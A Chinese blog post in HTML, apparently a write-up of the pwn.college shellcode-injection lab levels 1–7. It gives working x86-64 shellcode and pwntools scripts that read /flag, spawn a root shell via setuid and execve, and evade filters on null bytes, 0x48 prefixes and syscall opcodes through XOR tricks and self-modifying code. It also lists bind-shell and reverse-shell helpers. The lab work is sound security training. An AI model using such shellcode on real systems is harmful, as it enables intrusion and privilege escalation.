

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/first.png">
  <link rel="icon" href="/img/first.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Nuthecz">
  <meta name="keywords" content="">
  
    <meta name="description" content="Shellcode Injection  基础知识  gcc汇编 Our way of building shellcode translates well to other architectures:  amd64:gcc -nostdlib -static shellcode.s -o shellcode-elf mips:mips-linux-gnu-gcc -nostdlib shel">
<meta property="og:type" content="article">
<meta property="og:title" content="Pwn.college(2)">
<meta property="og:url" content="http://example.com/posts/b0a958e2.html">
<meta property="og:site_name" content="Nuthecz&#96;Blog">
<meta property="og:description" content="Shellcode Injection  基础知识  gcc汇编 Our way of building shellcode translates well to other architectures:  amd64:gcc -nostdlib -static shellcode.s -o shellcode-elf mips:mips-linux-gnu-gcc -nostdlib shel">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000797.jpg">
<meta property="article:published_time" content="2024-02-06T15:47:45.000Z">
<meta property="article:modified_time" content="2024-06-21T04:12:02.372Z">
<meta property="article:author" content="Nuthecz">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000797.jpg">
  
  
  
  <title>Pwn.college(2) - Nuthecz`Blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/css/fluid-extension.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_ijqayz9ro8k.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>


<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Nuthecz</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402010000342.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="Pwn.college(2)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-02-06 23:47" pubdate>
          2024年2月6日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          53k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          442 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">Pwn.college(2)</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="shellcode-injection"><a class="markdownIt-Anchor" href="#shellcode-injection"></a> Shellcode Injection</h1>
<h2 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h2>
<h3 id="gcc汇编"><a class="markdownIt-Anchor" href="#gcc汇编"></a> gcc汇编</h3>
<p>Our way of building shellcode translates well to other architectures:</p>
<ul>
<li>amd64:<code>gcc -nostdlib -static shellcode.s -o shellcode-elf</code></li>
<li>mips:<code>mips-linux-gnu-gcc -nostdlib shellcode-mips.s -o shellcode-mips-elf</code></li>
</ul>
<p>参数说明：</p>
<ul>
<li><code>-nostdlib</code>：不使用标准库，使用标准库则必须有main函数</li>
<li><code>-static</code>：静态编译，这样就不会引用共享库了</li>
<li><code>-static-pie</code>：位置无关编译。</li>
</ul>
<p>Similarly, we can run cross-architecture shellcode with an emulator:</p>
<ul>
<li>amd64:<code>./shellcode</code></li>
<li>mips:<code>qemu-mips-static ./shellcode-mips</code></li>
</ul>
<h3 id="pwntools模块"><a class="markdownIt-Anchor" href="#pwntools模块"></a> pwntools模块</h3>
<p>​	pwntools可以通过<code>shellcraft</code>模块来自动生成shellcode。对于不同架构的shellcode，可以通过添加 <code>context(arch = 'amd64' , os = 'linux', log_level=&quot;debug&quot;)</code> 来进行区分生成。</p>
<p>​	常规操作</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#生成不带参数调用sh的代码：</span><br>shellcraft.sh()<br><br><span class="hljs-comment">#可以直接使用execve来调用带参数的sh：</span><br>shellcraft.execve(<span class="hljs-string">&#x27;sh&#x27;</span>,[<span class="hljs-string">&#x27;sh&#x27;</span>,<span class="hljs-string">&#x27;-p&#x27;</span>])<br><br><span class="hljs-comment">#生成插入指定字符串到栈中的代码：</span><br>shellcraft.pushstr(string, append_null=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#生成插入字符串序列到栈中的代码：</span><br><span class="hljs-comment">#可以和上面的sh()代码结合起来调用-p参数的sh</span><br>shellcraft.pushstr_array(reg, array)<br><br><span class="hljs-comment">#读取文件并回显，调用结构为：open()-&gt;sendfileto()</span><br>shellcraft.cat(filename, fd=<span class="hljs-number">1</span>)<br>shellcraft.cat2(filename, fd=<span class="hljs-number">1</span>, length=<span class="hljs-number">16384</span>)<br><br><span class="hljs-comment">#打开文件，得到的文件描述符在rax，文件打开标志oflag见下面，mode是文件权限默认为0：</span><br>shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, oflag=<span class="hljs-number">0</span>, mode=<span class="hljs-number">0</span>)<br><span class="hljs-comment">#读数据，fd可设为如rax这样的寄存器名，默认是将数据读取到栈中，默认读1字节：</span><br>shellcraft.read(fd=<span class="hljs-number">0</span>, buffer=<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><span class="hljs-comment">#写数据</span><br>shellcraft.write(fd=<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>, count=<span class="hljs-number">8</span>)<br><br><span class="hljs-comment">#读取指定路径的文件：</span><br>shellcraft.readfile(path, dst=<span class="hljs-string">&#x27;rdi&#x27;</span>)<br><br><span class="hljs-comment">#网络相关：</span><br><span class="hljs-comment">#当没有回显时，一般可以用网络操作得到程序交互</span><br><br><span class="hljs-comment">#将sh绑定到端口，作为tcp服务(network=&#x27;ipv4&#x27; or &#x27;ipv6&#x27;)：</span><br>shellcraft.bindsh(port, network)<br><br><span class="hljs-comment">#连接指定远程地址，连接得到的文件描述符放在rbp寄存器中：</span><br>shellcraft.connect(host, port, network=<span class="hljs-string">&#x27;ipv4&#x27;</span>)<br><br><span class="hljs-comment">#将输入输出全部绑定到指定文件描述符，一般用来将shell反弹到远程地址，dupsh可以在绑定之后自动启动sh：</span><br>shellcraft.dup(sock=<span class="hljs-string">&#x27;rbp&#x27;</span>)<br>shellcraft.dupsh(sock=<span class="hljs-string">&#x27;rbp&#x27;</span>)<br><br><span class="hljs-comment">#将字符串写入文件描述符指定文件：</span><br>shellcraft.echo(string, sock=<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure>
<h3 id="depnx"><a class="markdownIt-Anchor" href="#depnx"></a> DEP/NX</h3>
<p>​	数据执行防护(DEP) 或 No-Execute(NX)。 启用此选项后，它将与处理器配合工作，通过阻止从标记为不可执行的内存执行代码来帮助防止缓冲区溢出攻击。可以禁止将栈中的数据作为代码执行。</p>
<ul>
<li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)  不让执行栈上的数据，于是JMP ESP就不能用了</li>
</ul>
<h3 id="other"><a class="markdownIt-Anchor" href="#other"></a> other</h3>
<ul>
<li>
<p><a target="_blank" rel="noopener" href="https://yuankun.me/syscall32/">Linux System Call Table for x86</a></p>
</li>
<li>
<p><a target="_blank" rel="noopener" href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table for x86 64 · Ryan A. Chapman (rchapman.org)</a></p>
</li>
</ul>
<h2 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> level 1</h2>
<blockquote>
<p>多种方式获取flag，可以getshell，或者直接执行命令，或者pwntools</p>
</blockquote>
<ul>
<li>
<p>使用 gcc 编译可以直接使用下面的shell脚本</p>
</li>
<li>
<pre class="highlight"><code class="shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span>
gcc $1 -nostdlib -o d.out &amp;&amp; objcopy --dump-section .text=solve.bin d.out
rm d.out
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs awk"><br><span class="hljs-comment">### wp1</span><br><br>- 调用的是sendfile(<span class="hljs-number">1</span>, open(<span class="hljs-string">&quot;/flag&quot;</span>, NULl), <span class="hljs-number">0</span>, <span class="hljs-number">1000</span>)，第三个参数表示从文件什么地方读，这里<span class="hljs-string">&quot;0&quot;</span>表示从开头读取<br><br>- 这里 `rdi rsi rdx r10` 依次是函数的参数指代的寄存器，其中 rdi 中存储的地址指向需要的字符串<br>- syscall `open rax=<span class="hljs-number">2</span>, sendfile rax=<span class="hljs-number">40</span>, <span class="hljs-keyword">exit</span> rax=<span class="hljs-number">60</span>, execve rax=<span class="hljs-number">59</span>`<br><br>```python<br>from pwn import *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br><br>r = process([<span class="hljs-string">&quot;/challenge/babyshell_level1&quot;</span>])<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">  mov rbx,0x00000067616c662f		</span><br><span class="hljs-string">  push rbx</span><br><span class="hljs-string">  mov rdi,rsp				# 先将&quot;/flag\0&quot;压栈，然后用rdi指代，这里rdi若指代字符串必须是赋值一个地址，这个地址指向那个字符串</span><br><span class="hljs-string">  mov rsi,0</span><br><span class="hljs-string">  mov rax,2</span><br><span class="hljs-string">  syscall					# open(&quot;/flag&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">  mov rdi,1</span><br><span class="hljs-string">  mov rsi,rax</span><br><span class="hljs-string">  mov rdx,0</span><br><span class="hljs-string">  mov r10,1000</span><br><span class="hljs-string">  mov rax,40</span><br><span class="hljs-string">  syscall					# sendfile</span><br><span class="hljs-string"></span><br><span class="hljs-string">  mov rax,60</span><br><span class="hljs-string">  syscall					#exit(rdi)-&gt;返回rdi</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload = asm(shellcode,arch=<span class="hljs-string">&quot;amd64&quot;</span>)<br>r.send(payload)<br><span class="hljs-comment"># r.interactive()</span><br>text = r.recvall().decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;pwn&quot;</span> <span class="hljs-keyword">in</span> text:<br>    log.success(text[text.find(<span class="hljs-string">&quot;pwn.college&#123;&quot;</span>):-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
<p>​	这里存一手d.s获取flag的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assemble">.global _start<br>.intel_syntax noprefix<br>_start:<br>    mov rbx,0x00000067616c662f			# open <br>    push rbx<br>    mov rdi,rsp				<br>    mov rsi,0<br>    mov rax,2<br>    syscall<br>    <br>    mov rdi,1							# sendline<br>    mov rsi,rax<br>    mov rdx,0<br>    mov r10,1000<br>    mov rax,40<br>    syscall<br>    <br>    mov rax,60							# exit<br>    syscall<br></code></pre></td></tr></table></figure>
<h3 id="wp2"><a class="markdownIt-Anchor" href="#wp2"></a> wp2</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># d.s<br>.global _start<br>.intel_syntax noprefix<br>_start:<br>        mov rax, 0x69           # setuid,设置特权,单纯使用shell不能提权<br>        mov rdi, 0<br>        syscall<br><br>        mov rax, 59             # execve<br>        lea rdi, [rip+binsh]<br>        mov rsi, 0<br>        mov rdx, 0<br>        syscall<br>binsh:<br>        .string &quot;/bin/sh&quot;<br></code></pre></td></tr></table></figure>
<h2 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> level 2</h2>
<blockquote>
<p>过滤了前面0x800的字节，使用.rept来重复填充，然后使用level1的代码</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rept 0x800<br>	nop<br>.endr<br></code></pre></td></tr></table></figure>
<p>或者 <code>payload = asm(shellcode, arch=’amd64’).rjust(0x900, b’\x90’)</code></p>
<h2 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> level 3</h2>
<blockquote>
<p>这里要求不能使用空字节(0x00)，所以换一种方式。可以对应strcpy的栈溢出，它不能使用空字节</p>
</blockquote>
<ul>
<li>
<p>这里就是使用 <code>0xffffffffffffffff</code> 和 <code>xor</code> 来实现 level 1的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assemble">mov rcx,0xffffffffffffffff<br>mov rbx,0xffffff989e9399d0<br>xor rbx,rcx						# 这里xor之后就是0x00000067616c662f-&gt;&quot;/flag\0&quot;<br>push rbx<br>mov rdi,rsp				<br>xor rsi,rsi						# 这里异或也可以实现清零<br>mov rax,0xfffffffffffffffd<br>xor rax,rcx<br>syscall			<br>mov rcx,0xffffffffffffffff		# 这里注意需要重新赋值，因为open之后rcx改变了。这里需要注意，是哦那个gdb才调试出来的<br>mov rdi,0xfffffffffffffffe		<br>xor rdi,rcx<br>mov rsi,rax<br>xor rdx,rdx<br>mov r10,0xfffffffffffffc17<br>xor r10,rcx<br>mov rax,0xffffffffffffffd7<br>xor rax,rcx<br>syscall<br>mov rax,0xffffffffffffffc3<br>xor rax,rcx<br>syscall<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>另外这里对于&quot;/flag\0&quot;还可以采用直接赋值的操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ass"># mov rbx,0x00000067616c662f		<br># push rbx<br># mov rdi,rsp<br>mov byte ptr [rsp], &#x27;/&#x27;<br>mov byte ptr [rsp+1], &#x27;f&#x27;<br>mov byte ptr [rsp+2], &#x27;l&#x27;<br>mov byte ptr [rsp+3], &#x27;a&#x27;<br>mov byte ptr [rsp+4], &#x27;g&#x27;<br>xor cl, cl<br>mov byte ptr [rsp+5], cl<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>对于rax设置成小数值可以采用 <code>inc</code> 或者给限定内存赋值</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">inc</span> <span class="hljs-built_in">rax</span><br><br><span class="hljs-keyword">xor</span> <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">rax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span>], <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure>
</li>
</ul>
<p>​	gdb调试指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">生成二进制程序，这里注意在 syscall 后面可以使用 int 3 来中断，然后结合gdb来调试</span><br>gcc -Wl,N -static -nostdlib d.s -o d.elf	<br><span class="hljs-meta prompt_">	# </span><span class="language-bash">l 是链接，其中提供了.text段可写(服务于类似 inc byte ptr [rip])</span><br><span class="hljs-meta prompt_">	# </span><span class="language-bash">w 不生成警告，有的警告不能编译</span><br>gdb d.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">提取机器码d.bin，这里就是把.text段单独拿出来</span><br>objcopy --dump-section .text=d.bin d.elf<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看转化后的十六进制数据</span><br>hd d.bin <br><span class="hljs-meta prompt_"># </span><span class="language-bash">将shellcode传入程序</span><br>cat d.bin | /challenge/babyshell_level1<br></code></pre></td></tr></table></figure>
<h2 id="level-4"><a class="markdownIt-Anchor" href="#level-4"></a> level 4</h2>
<blockquote>
<p>过滤了扩展指令0x48(H)，0x40是扩展长度指令的标志，对于64位寄存器的操作会出现这个标志</p>
<p>ps: push、pop 64寄存器；使用r8、r9寄存器 都不会出现0x48</p>
</blockquote>
<p>​	可以先查看哪些指令使用0x48，然后再逐个攻破</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -nostdlib -static d.s -o d.elf<br>objdump -M intel -d d.elf | grep 48<br></code></pre></td></tr></table></figure>
<p>​	然后wp就容易了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">from pwn import *<br>import glob<br>context.log_level=&#x27;info&#x27;<br>context(arch = &#x27;amd64&#x27; , os = &#x27;linux&#x27;, log_level=&quot;debug&quot;)<br>binary_paths = glob.glob(&quot;/challenge/babyshell_level[0-9]&quot;)<br>r = process(binary_paths)<br>shellcode = &quot;&quot;&quot;<br>  mov r8,0x00000067616c662f		<br>  push r8<br>  push rsp					<br>  pop rdi						# 这里通过push,pop来传递数据<br>  xor esi,esi<br>  mov al,2<br>  syscall			<br><br>  mov edi,1<br>  push rax<br>  pop rsi<br>  mov edx,0<br>  mov r10,1000<br>  mov al,40<br>  syscall<br><br>  mov al,60<br>  syscall<br>&quot;&quot;&quot;<br>payload = asm(shellcode,arch=&quot;amd64&quot;)<br>r.send(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure>
<h2 id="level-5"><a class="markdownIt-Anchor" href="#level-5"></a> level 5</h2>
<blockquote>
<p>不能用 0f05 (<code>syscall</code>), 0f34 (<code>sysenter</code>), and 80cd (<code>int</code>)</p>
</blockquote>
<p>​	有点玄学，一开始过不去，之后突然就能过了，很奇怪。本来以为过不去是需要.text段可写才行，然后它gcc使用<code>-Wl,N</code> 还报错链接不了，不知道教程上那个视频用这个命令咋成功的。</p>
<p>​	补充：看了下一题才明白，它原来本身就有 write 的权限。Removing write permissions from first 4096 bytes of shellcode。下一题取消了前 4096 byte 的写权限，说明之前本身就有权限。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs assembly">	inc byte ptr [rip+syscall1]<br>    inc byte ptr [rip+syscall2]<br>    inc byte ptr [rip+syscall3]			# 修改.byte来绕过检测<br>    mov rbx,0x00000067616c662f		<br>    push rbx<br>    mov rdi,rsp				<br>    mov rsi,0<br>    mov rax,2<br>syscall1:  			<br>    .byte 0x0e<br>    .byte 0x05<br><br>    mov rdi,1<br>    mov rsi,rax<br>    mov rdx,0<br>    mov r10,1000<br>    mov rax,40<br>syscall2:  			<br>    .byte 0x0e<br>    .byte 0x05<br><br>    mov rax,60<br>syscall3:  			<br>    .byte 0x0e<br>    .byte 0x05<br></code></pre></td></tr></table></figure>
<p>​	还可以使用 <code>jmp</code> 来跳转到栈上的syscall，但是这个只适用于只有一个系统调用的，例如 <code>execve(path='/bin///sh', argv=['sh','-p'], envp=0) </code>(这是由shellcraft.execve(‘sh’,[‘sh’,‘-p’])生成的，这里如果没有-p，那么这个shell就没有相应权限了。该程序好像有特定的格式，自己写的老是不对)，因为调用了就回不到现在的程序了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#syscall<br>   push 0x050e<br>   inc qword ptr [rsp]<br>   jmp rsp<br></code></pre></td></tr></table></figure>
<h2 id="level-7"><a class="markdownIt-Anchor" href="#level-7"></a> level 7</h2>
<blockquote>
<p>没太搞明白，这里没有权限的限制</p>
</blockquote>
<p>​	直接使用chomod给flag权限，然后就可以读到了</p>
